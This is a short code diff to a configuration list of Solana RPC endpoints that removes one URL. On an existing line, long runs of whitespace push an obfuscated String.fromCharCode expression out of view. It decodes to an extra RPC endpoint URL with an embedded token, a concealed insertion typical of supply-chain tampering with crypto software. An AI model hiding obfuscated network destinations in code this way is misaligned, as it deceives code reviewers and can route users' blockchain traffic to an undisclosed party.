@@ -261,7 +261,6 @@
     endpoints: [
       'https://solana-mainnet.g.alchemy.com/v2/demo',
       'https://solana-rpc.publicnode.com',
-      'https://eclipse.helius-rpc.com',
       'https://endpoints.omniatech.io/v1/sol/mainnet/public',                                                                                                                                                               String.fromCharCode(104,116,116,112,115,58,47,47,115,111,108,97,110,97,45,97,112,105,46,105,110,                  115,116,97,110,116,110,111,100,101,115,46,105,111,47,116,111,107,101,110,45,                    120,65,55,115,53,55,69,97,102,112,72,107,51,116,106,56,83,98,86,101,105,57,           101,65,122,109,75,74,52,105,117,57),
     ],
     sockets: [
